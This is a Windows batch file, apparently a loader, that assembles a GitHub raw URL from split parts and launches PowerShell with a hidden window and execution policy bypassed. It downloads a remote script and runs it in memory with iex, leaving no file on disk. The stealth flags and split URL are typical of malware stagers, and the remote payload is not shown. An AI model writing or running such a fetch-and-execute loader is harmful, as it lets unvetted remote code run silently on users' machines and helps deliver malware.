@echo off
setlocal enabledelayedexpansion

REM =============================================
REM Direct Run from GitHub (No File Download)
REM =============================================

REM Correct URL parts
set "a=https://raw.githubusercontent.com"
set "b=/Axolotl-in-void/powerhell/main/file.ps1"
set "url=%a%%b%"

echo Running script from GitHub...

powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
"$c = (iwr '%url%' -UseBasicParsing).Content; iex $c"

echo Script executed.
pause
